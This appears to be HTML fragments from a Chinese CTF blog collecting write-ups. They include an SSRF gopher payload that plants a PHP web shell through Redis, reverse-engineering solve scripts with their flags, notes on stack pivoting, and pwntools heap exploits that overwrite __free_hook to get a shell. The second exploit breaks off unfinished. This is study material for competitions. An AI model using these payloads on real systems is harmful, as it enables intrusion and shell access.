&lt;p&gt;payload：&lt;code&gt;url=gopher://172.192.97.3:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2428%0D%0A%0A%0A%3C%3F%20system%28%27cat%20/f%2A%27%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A&lt;/code&gt; &lt;/p&gt;
&lt;p&gt;再利用SSRF访问172.192.97.3/shell.php，成功得到回显&lt;/p&gt;
&lt;p&gt; &lt;a href=&#34;https://camo.githubusercontent.com/cec85a0008cd3a8afbb1e707d6e5dfb34351e6c04482ce64d1e181b99dda64a5/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f61643965366334393237633731666133313761646338383235353265373761642e706e67&#34;&gt;&lt;img data-src=&#34;https://camo.githubusercontent.com/cec85a0008cd3a8afbb1e707d6e5dfb34351e6c04482ce64d1e181b99dda64a5/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f61643965366334393237633731666133313761646338383235353265373761642e706e67&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;题目思路来源&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1hEU0VDL21vZUNURl8yMDIw&#34;&gt;西电安全协会&lt;/span&gt;&lt;/p&gt;

 &lt;h1 id=&#34;最近要比赛reverse，积累一些逆向代码&#34;&gt;&lt;a href=&#34;#最近要比赛reverse，积累一些逆向代码&#34; class=&#34;headerlink&#34; title=&#34;最近要比赛reverse，积累一些逆向代码&#34;&gt;&lt;/a&gt;最近要比赛reverse，积累一些逆向代码&lt;/h1&gt;&lt;h2 id=&#34;xctf-Reversing-x64Elf-100&#34;&gt;&lt;a href=&#34;#xctf-Reversing-x64Elf-100&#34; class=&#34;headerlink&#34; title=&#34;xctf: Reversing-x64Elf-100&#34;&gt;&lt;/a&gt;xctf: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cmV2ZXJzZSZudW1iZXI9NCZncmFkZT0xJmlkPTQ4MjYmcGFnZT0y&#34;&gt;Reversing-x64Elf-100&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/1639387679(1).jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;进入sub_4006FD函数&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/1639387750(1).jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;逆向脚本：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;a = [&amp;#39;Dufhbmf&amp;#39;,&amp;#39;pG`imos&amp;#39;,&amp;#39;ewUglpt&amp;#39;]
flag = &amp;#39;&amp;#39;
for i in range(12):
    flag = flag + chr(  ord(   a[i%3][2* int(i/3)]   )  -1 )
print(flag) 
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;xctf&#34;&gt;&lt;a href=&#34;#xctf&#34; class=&#34;headerlink&#34; title=&#34;xctf&#34;&gt;&lt;/a&gt;xctf&lt;/h2&gt;

 &lt;h2 id=&#34;0x01-stack-pivoting&#34;&gt;&lt;a href=&#34;#0x01-stack-pivoting&#34; class=&#34;headerlink&#34; title=&#34;0x01 stack pivoting&#34;&gt;&lt;/a&gt;0x01 stack pivoting&lt;/h2&gt;&lt;p&gt;栈迁移就是因为可写空间太小不够rop，就把栈迁移到别的地方去构造payload。&lt;br&gt; 而栈迁移最重要的是两个汇编命令，在程序调用完成 call 返回的时候。&lt;/p&gt;
&lt;p&gt; leave； ret;&lt;br&gt; leave相对于是mov esp，ebp；pop ebp；把bp的值给sp，弹出bp;&lt;br&gt; ret是pop eip;&lt;/p&gt;
&lt;h2 id=&#34;0x02-Principle&#34;&gt;&lt;a href=&#34;#0x02-Principle&#34; class=&#34;headerlink&#34; title=&#34;0x02 Principle&#34;&gt;&lt;/a&gt;0x02 Principle&lt;/h2&gt;&lt;p&gt;先从32位来理解栈迁移的利用原理。&lt;br&gt;stack pivoting，正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。一般来说，我们可能在以下情况需要使用 stack pivoting&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链&lt;/li&gt;
&lt;li&gt;开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。&lt;/li&gt;
&lt;li&gt;其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用&lt;/li&gt;
&lt;/ol&gt;

 &lt;p&gt;2021/10/21 更新了REVERSE1-schoolboy.apk&lt;/p&gt;
&lt;h1 id=&#34;Antidebug&#34;&gt;&lt;a href=&#34;#Antidebug&#34; class=&#34;headerlink&#34; title=&#34;Antidebug&#34;&gt;&lt;/a&gt;Antidebug&lt;/h1&gt;&lt;p&gt;使用resource hacker 获得输入框的id：&lt;br&gt;&lt;img data-src=&#34;/img/reverse/antidebug1.jpg&#34; alt=&#34;avatar&#34;&gt;&lt;/p&gt;
&lt;p&gt;用ida搜索立即数，可以搜索0x3e8  可以直接搜索1000：&lt;br&gt;&lt;img data-src=&#34;/img/reverse/antidebug2.jpg&#34; alt=&#34;avatar&#34;&gt;&lt;/p&gt;
&lt;p&gt;双击找到调用位置:&lt;br&gt;发现有jz 和 jnz跳转到相同位置，初步怀疑这里有花指令影响了ida的正常运行：&lt;br&gt;&lt;img data-src=&#34;/img/reverse/antidebug3.jpg&#34; alt=&#34;avatar&#34;&gt;&lt;/p&gt;
&lt;p&gt;key path -&amp;gt; Fill range 全部pathc为nop。注意 00401524是个多字节指令，先使用快捷键d转为数据，将00401524patch为0x90后，再将后边的使用快捷键c转为代码：&lt;br&gt;&lt;img data-src=&#34;/img/reverse/antidebug4.jpg&#34; alt=&#34;avatar&#34;&gt;&lt;/p&gt;
&lt;p&gt;在找到函数开始的位置push ebp的地方，右键 create function&lt;br&gt;F5 可以看到是固定判断，只要输入的值是0xABCDDCBA  ，那也就是个数字了。&lt;br&gt;即2882395322 就可以了。&lt;br&gt;&lt;img data-src=&#34;/img/reverse/antidebug5.jpg&#34; alt=&#34;avatar&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;REVERSE1-schoolboy-apk&#34;&gt;&lt;a href=&#34;#REVERSE1-schoolboy-apk&#34; class=&#34;headerlink&#34; title=&#34;REVERSE1-schoolboy.apk&#34;&gt;&lt;/a&gt;REVERSE1-schoolboy.apk&lt;/h1&gt;&lt;p&gt;REVERSE1-schoolboy.apk&lt;br&gt;Apk文件反編譯&lt;br&gt;用一些jeb jadx apkIDE都可以&lt;br&gt;Jeb和apkIDE搜索方便一點&lt;br&gt;Jadx快一點&lt;/p&gt;
&lt;p&gt;我用的apkIDE和jeb&lt;br&gt;搜索mainactivity&lt;br&gt;&lt;img data-src=&#34;/img/reverse/reverseschoolboy1.jpg&#34; alt=&#34;avatar&#34;&gt;&lt;/p&gt;
&lt;p&gt;反編譯&lt;br&gt;&lt;img data-src=&#34;/img/reverse/reverseschoolboy2.jpg&#34; alt=&#34;avatar&#34;&gt;&lt;/p&gt;
&lt;p&gt;找到主要内容&lt;br&gt;Id號為0x7F0E005D&lt;br&gt;GetStrings方法&lt;br&gt;&lt;img data-src=&#34;/img/reverse/reverseschoolboy3.jpg&#34; alt=&#34;avatar&#34;&gt;&lt;/p&gt;
&lt;p&gt;用smail全局搜索id號得到&lt;br&gt;&lt;img data-src=&#34;/img/reverse/reverseschoolboy4.jpg&#34; alt=&#34;avatar&#34;&gt;&lt;/p&gt;
&lt;p&gt;Id號為&lt;br&gt;&lt;img data-src=&#34;/img/reverse/reverseschoolboy5.jpg&#34; alt=&#34;avatar&#34;&gt;&lt;/p&gt;
&lt;p&gt;在mysecret裏面&lt;br&gt;搜索strings.xml&lt;br&gt;resources.arsc-res-values-strings.xml&lt;br&gt;&lt;img data-src=&#34;/img/reverse/reverseschoolboy6.jpg&#34; alt=&#34;avatar&#34;&gt;&lt;/p&gt;
&lt;p&gt;找到mysecret&lt;br&gt;&lt;img data-src=&#34;/img/reverse/reverseschoolboy7.jpg&#34; alt=&#34;avatar&#34;&gt;&lt;/p&gt;
&lt;p&gt;EBRQFBDfWY5MDgzOj9vbiNzdCcicXBxeiwteS0vfHtDQhZAFRwfWggJCgsMDQ4P&lt;br&gt;看上去像加密的&lt;br&gt;寫脚本&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import base64
a = &amp;quot;REBRQFBDfWY5MDgzOj9vbiNzdCcicXBxeiwteS0vfHtDQhZAFRwfWggJCgsMDQ4P&amp;quot;
b = base64.b64decode(a).decode(&amp;quot;utf-8&amp;quot;)
for i in range(len(b)):
    print(chr(ord(b[i])^i),end=&amp;#39;&amp;#39;)

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/reverse/reverseschoolboy8.jpg&#34; alt=&#34;avatar&#34;&gt;&lt;br&gt;直接出&lt;br&gt;flag:&lt;br&gt;DASCTF{a192862aa3bf46dffb57b12bdcc4c199}&lt;/p&gt;

&lt;h1 id=&#34;记录两个堆的比赛题&#34;&gt;&lt;a href=&#34;#记录两个堆的比赛题&#34; class=&#34;headerlink&#34; title=&#34;记录两个堆的比赛题&#34;&gt;&lt;/a&gt;记录两个堆的比赛题&lt;/h1&gt;&lt;p&gt;比较穷网盘没有会员附件私聊我&lt;/p&gt; &lt;h1 id=&#34;pwn1&#34;&gt;&lt;a href=&#34;#pwn1&#34; class=&#34;headerlink&#34; title=&#34;pwn1&#34;&gt;&lt;/a&gt;pwn1&lt;/h1&gt;&lt;p&gt;&lt;img data-src=&#34;/img/PWN/zhiye2.png&#34; alt=&#34;avatar&#34;&gt;&lt;/p&gt; &lt;p&gt;&lt;img data-src=&#34;/img/PWN/zhiye.png&#34; alt=&#34;avatar&#34;&gt;&lt;br&gt;堆溢出&lt;br&gt;感觉比较基础&lt;br&gt;堆溢出改大小制造重叠堆块&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;python&#34;&gt;from pwn import * #io=process(&amp;#39;./pwn1&amp;#39;) io=remote(&amp;#39;119.61.19.212&amp;#39;,57511) elf=ELF(&amp;#39;./pwn1&amp;#39;) libc=ELF(&amp;#39;./libc-2.31.so&amp;#39;) #libc=elf.libc context.log_level=&amp;#39;debug&amp;#39;
def add(context): io.sendlineafter(&amp;#39;&amp;gt;&amp;gt; &amp;#39;,&amp;#39;1&amp;#39;) io.sendlineafter(&amp;#39;content: &amp;#39;,context)
def dele(index): io.sendlineafter(&amp;#39;&amp;gt;&amp;gt; &amp;#39;,&amp;#39;2&amp;#39;) io.sendlineafter(&amp;#39;index: &amp;#39;,str(index))
def show(index): io.sendlineafter(&amp;#39;&amp;gt;&amp;gt; &amp;#39;,&amp;#39;3&amp;#39;) io.sendlineafter(&amp;#39;index: &amp;#39;,str(index))
def exp(): for i in range(10): add(&amp;#39;aaaa&amp;#39;)#0
dele(0) add(&amp;#39;a&amp;#39;*0x80+p64(0)+p64(0x481)) dele(1)
add(&amp;#39;a&amp;#39;)#1 show(2) malloc_hook=u64(io.recvuntil(&amp;#39;\x7f&amp;#39;)[-6:].ljust(8,&amp;#39;\x00&amp;#39;))-96-16 libc_base=malloc_hook-libc.symbols[&amp;#39;__malloc_hook&amp;#39;] print(&amp;#39;libc_base&amp;#39;,hex(libc_base)) system=libc_base+libc.symbols[&amp;#39;system&amp;#39;] free_hook=libc_base+libc.symbols[&amp;#39;__free_hook&amp;#39;]
add(&amp;#39;a&amp;#39;)#10 add(&amp;#39;a&amp;#39;) dele(3) dele(2) dele(1)
add(&amp;#39;a&amp;#39;*0x80+p64(0)+p64(91)+p64(free_hook-8))#1 #gdb.attach(io) add(&amp;#39;a&amp;#39;)#2 add(&amp;#39;/bin/sh\x00&amp;#39;+p64(system))#3
dele(3) io.interactive() exp() &lt;/code&gt;&lt;/pre&gt; &lt;h1 id=&#34;pwn2&#34;&gt;&lt;a href=&#34;#pwn2&#34; class=&#34;headerlink&#34; title=&#34;pwn2&#34;&gt;&lt;/a&gt;pwn2&lt;/h1&gt;&lt;p&gt;比赛就两小时&lt;br&gt;想办法绕过这有点麻烦&lt;br&gt;&lt;img data-src=&#34;/img/PWN/zhiye3.png&#34; alt=&#34;avatar&#34;&gt;&lt;br&gt;最后复现出来&lt;br&gt;exp：&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;python&#34;&gt;from pwn import * io=process(&amp;#39;./pwn2&amp;#39;) elf=ELF(&amp;#39;./pwn2&amp;#39;) libc=elf.libc context.log_level=&amp;#39;debug&amp;#39;
def add(size): io.sendlineafter(&amp;#39;&amp;gt;&amp;gt; &amp;#39;,&amp;#39;1&amp;#39;) io.sendlineafter(&amp;#39;size: &amp;#39;,str(size))
def dele(index): io.sendlineafter(&amp;#39;&amp;gt;&amp;gt; &amp;#39;,&amp;#39;2&amp;#39;) io.sendlineafter(&amp;#39;index: &amp;#39;,str(index))
def edit(index,content): io.sendlineafter(&amp;#39;&amp;gt;&amp;gt; &amp;#39;,&amp;#39;3&amp;#39;) io.sendlineafter(&amp;#39;index: &amp;#39;,str(index)) io.sendafter(&amp;#39;content: &amp;#39;,content)
def show(index): io.sendlineafter(&amp;#39;&amp;gt;&amp;gt; &amp;#39;,&amp;#39;4&amp;#39;) io.sendlineafter(&amp;#39;index: &amp;#39;,str(index))
def exp(): for i in range(4): add(0x1f8)#0~3 for i in range(2): add(0xe8)#4~5 for i in range(6): dele(4) edit(4,&amp;#39;\x00&amp;#39;*0x10) for i in range(7): dele(3) edit(3,&amp;#39;\x00&amp;#39;*0x10)
dele(0) dele(2) show(0) io.recvuntil(&amp;#39;ent: &amp;#39;) libc_base=u64(io.recv(6)+&amp;#39;\x00\x00&amp;#39;)-libc.symbols[&amp;#39;__malloc_hook&amp;#39;]-96-16 binsh=libc_base+libc.search(&amp;#39;/bin/sh&amp;#39;).next() system=libc_base+libc.symbols[&amp;#39;system&amp;#39;] free_hook=libc_base+libc.symbols[&amp;#39;__free_hook&amp;#39;] global_max_fast=libc_base+0x1eeb80 print(&amp;#39;libc_base&amp;#39;,hex(libc_base))
show(2) io.recvuntil(&amp;#39;ent: &amp;#39;) heap_base=u64(io.recv(6).ljust(8,&amp;#39;\x00&amp;#39;))+0x110 print(&amp;#39;heap_base&amp;#39;,hex(heap_base))
